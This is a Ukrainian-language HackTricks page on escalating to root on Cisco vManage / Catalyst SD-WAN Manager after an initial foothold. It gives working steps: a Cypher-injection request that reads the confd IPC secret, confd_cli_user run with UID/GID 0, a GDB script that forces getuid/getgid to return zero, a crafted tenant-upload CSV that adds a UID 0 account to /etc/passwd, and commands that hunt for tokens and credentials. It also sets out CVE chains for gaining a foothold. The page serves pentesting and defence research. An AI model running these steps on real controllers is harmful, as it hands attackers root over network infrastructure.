# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Після отримання виконання коду на Cisco vManage / *Catalyst SD-WAN Manager* від імені `vmanage`, `netadmin` або `vmanage-admin` найцікавішими локальними поверхнями для privesc зазвичай є стек CLI `confd`, допоміжний засіб `cmdptywrapper`, REST API на localhost і обробники імпорту/завантаження, якими володіє root.

Якщо вам усе ще потрібен **початковий foothold** на контролері, спершу перегляньте спеціальну сторінку control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Швидке локальне сортування
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Якщо `/etc/confd/confd_ipc_secret` доступний для читання з вашого foothold, Path 1 і Path 2 стають одразу практичними. Якщо ви отримали доступ через remote info leak або webshell, також перевірте, чи можете ви вже отримати доступ до SSH-матеріалів `vmanage-admin` або multitenancy upload handlers: дослідження 2026 року показало, що обидва варіанти були реалістичними сходинками.

## Path 1

(Приклад із [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))<sup>[[5]](#references)</sup>

Після невеликого вивчення деякої [документації](http://66.218.245.39/doc/html/rn03re18.html), пов’язаної з `confd` і різними binary-файлами (доступними за наявності облікового запису на вебсайті Cisco), ми з’ясували, що для автентифікації IPC socket використовується secret, розташований у `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Пам'ятаєте наш екземпляр Neo4j? Він працює з привілеями користувача `vmanage`, що дає нам змогу отримати файл за допомогою попередньої вразливості:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Програма `confd_cli` не підтримує аргументи командного рядка, але викликає `/usr/bin/confd_cli_user` з аргументами. Отже, ми можемо безпосередньо викликати `/usr/bin/confd_cli_user` із власним набором аргументів. Однак із нашими поточними привілеями цей файл недоступний для читання, тому нам потрібно отримати його з rootfs і скопіювати за допомогою scp, прочитати help та використати його для отримання shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Шлях 2

(Приклад із [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))<sup>[[6]](#references)</sup>

У блозі<sup>[[5]](#references)</sup> команди synacktiv описано елегантний спосіб отримати root shell, але є нюанс: для цього потрібно отримати копію `/usr/bin/confd_cli_user`, яку може читати лише root. Я знайшов інший спосіб підвищити привілеї до root без таких складнощів.

Коли я дизасемблював binary `/usr/bin/confd_cli`, то побачив таке:

<details>
<summary>Objdump, що показує отримання UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Коли я запускаю “ps aux”, я помітив наступне (_примітка: -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Я припустив, що програма “confd_cli” передає ідентифікатор користувача та ідентифікатор групи, отримані від користувача, який увійшов у систему, застосунку “cmdptywrapper”.

Моя перша спроба полягала в тому, щоб запустити “cmdptywrapper” безпосередньо, передавши йому `-g 0 -u 0`, але це не спрацювало. Схоже, десь у процесі створюється файловий дескриптор (-i 1015), і я не можу його підробити.

Як згадувалося в блозі synacktiv(останній приклад), програма `confd_cli` не підтримує аргументи командного рядка, але я можу впливати на неї за допомогою debugger, і, на щастя, у системі є GDB.

Я створив GDB script, у якому змусив API `getuid` і `getgid` повертати 0. Оскільки через deserialization RCE я вже маю privilege “vmanage”, я маю дозвіл безпосередньо читати `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Вивід консолі:

<details>
<summary>Вивід консолі</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Шлях 3 (помилка перевірки введення CLI 2025 року - CVE-2025-20122)

Пізніше Cisco описала чистіший локальний шлях до root у власному advisory для [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **автентифікований attacker лише з read-only привілеями** міг надіслати спеціально сформований запит до CLI менеджера та отримати root через недостатню перевірку введення.<sup>[[7]](#references)</sup>

З offensive perspective, важливі такі висновки:

1. Щойно ви отримали *будь-який foothold із низькими привілеями на пристрої, спершу перевірте локальний CLI service, перш ніж переходити до складнішого workflow Path 1 / Path 2.
2. Повторно використайте артефакти з Path 2, щоб знайти trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Вважайте підозрілим кожне поле, яке передається до CLI backend: UID/GID, username, метадані термінала, імпортовані файли або будь-яке значення, яке згодом обробляє helper, що належить root.
4. Якщо low-priv user може отримати доступ до локального CLI socket і впливати на ці поля, до root може бути лише один спеціально сформований запит.

Практичний workflow після отримання доступу до пристрою:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Це перетворює bug 2025 року на корисний hunting pattern для схожих версій: шукайте **локальні CLI shims, які збирають ідентифікаційні дані в userland і передають їх привілейованій wrapper-програмі**.

Не плутайте **CVE-2025-20122** із пізнішою **CVE-2026-20122**: проблема 2025 року є *локальним* CLI-to-root bug, тоді як проблема 2026 року є *віддаленим* arbitrary file overwrite через API, який переважно корисний для встановлення foothold, а потім повернення до Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

У рекомендаціях Cisco за лютий 2026 року також було представлено ще один корисний клас privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) дозволяла **автентифікованому локальному attacker із низькими привілеями** отримати root через недостатній механізм автентифікації користувачів у REST API.<sup>[[1]](#references)</sup>

Це важливо, оскільки privesc у vManage більше не обмежується зловживанням `confd`/TTY. Після отримання low-priv shell також шукайте:

- API endpoints, доступні лише через localhost, які надмірно довіряють caller
- tokens, cookies або service credentials, доступні для читання поточному акаунту
- дії, доступні лише root, відкриті через `dataservice`/REST handlers, які все ще можна локально trigger

На практиці, отримавши shell від імені `vmanage` або іншого service user, local API abuse часто є тихішим і його простіше автоматизувати, ніж interactive CLI abuse:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Якщо локального контексту сесії достатньо для доступу до привілейованої REST-функціональності, надавайте перевагу API-шляху: його простіше відтворювати, автоматизувати та поєднувати з викраденими web-сесіями або API-токенами.

## Шлях 5 (файл, створений у 2026 році, оброблений root - CVE-2026-20245)

Інший нещодавній приклад — [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): локальний атакувальник із привілеями `netadmin` міг завантажити **спеціально сформований файл**, який CLI згодом небезпечно обробляв, що призводило до command injection від імені `root`.<sup>[[2]](#references)</sup>

З погляду HackTricks, цінною є техніка, ширша за конкретну CVE:

1. Перелічіть усі CLI- або web-процеси, які приймають файли: імпорти, діагностичні пакети, шаблони, валідатори, резервні копії, дані tenant тощо.
2. Визначте, куди потрапляє завантажений файл і який скрипт або бінарний файл, що належить root, його обробляє.
3. Перевірте, чи передаються ім’я файлу, його вміст або розібрані метадані до shell-команд, wrapper-скриптів або helper-функцій на кшталт `system()`.
4. Якщо ви вже можете отримати доступ до `netadmin` (за допомогою дійсних облікових даних, викраденої сесії або ланцюжка auth-bypass), помилки обробки файлів часто є найшвидшим шляхом до root.

Згодом Google Cloud / Mandiant продемонстрували цілком конкретний випадок експлуатації цього класу помилок через шлях імпорту multitenancy:<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
У спостереженій атаці створений CSV зрештою модифікував `/etc/passwd` і `/etc/shadow`, щоб створити тимчасовий обліковий запис із UID 0 (`troot`).<sup>[[4]](#references)</sup> Це робить імпортери на кшталт `tenant-upload` / `tenant-list` особливо цікавими: це не просто функції приймання даних, а потенційні інтерфейси парсерів, що працюють із правами root.

Швидкий шаблон пошуку на рівні shell має такий вигляд:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Цей клас багів особливо добре комбінується з remote footholds, які надають `netadmin`, але не `root`.

## Інші нещодавні вразливості vManage/Catalyst SD-WAN Manager для комбінування

- **Unauthenticated info leak (CVE-2026-20133)** – Особливо цінна, оскільки публічне дослідження показало, що вона може розкрити `confd_ipc_secret` або приватний ключ `vmanage-admin`, перетворюючи bug читання або на Path 1, або на NETCONF pivot.<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Відрізняється від описаного вище CLI bug 2025 року; VulnCheck використала її для завантаження webshell, після чого local privesc paths на цій сторінці одразу стають актуальними.<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – Викрасти admin session у web UI, а потім виконувати pivot через API/CLI actions, які зрештою приводять до `vshell` або одного з наведених вище local privesc paths.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Дуже сильний precursor для Path 5, оскільки `netadmin` є саме тим рівнем, який потрібен для crafted-file privesc 2026 року.<sup>[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – Має подібну offensive value до CVE-2026-20122, але використовує пізніший web UI upload path: записати файл у місце, яке згодом буде оброблено root або web tier management-plane.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Інциденти 2026 року показали, що attackers можуть відкотитися до старішої вразливої SD-WAN build, використати старий CLI root bug, а потім відновити початкову версію.<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Детальніше описана на спеціальній сторінці про SD-WAN control-plane; вона може додати SSH key для `vmanage-admin`, надаючи local foothold, необхідний для повернення до цієї сторінки.



## Посилання

- [1] [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1: Attacking vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — From CSRF to Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Active exploitation of Cisco Catalyst SD-WAN by UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)

{{#include ../../banners/hacktricks-training.md}}
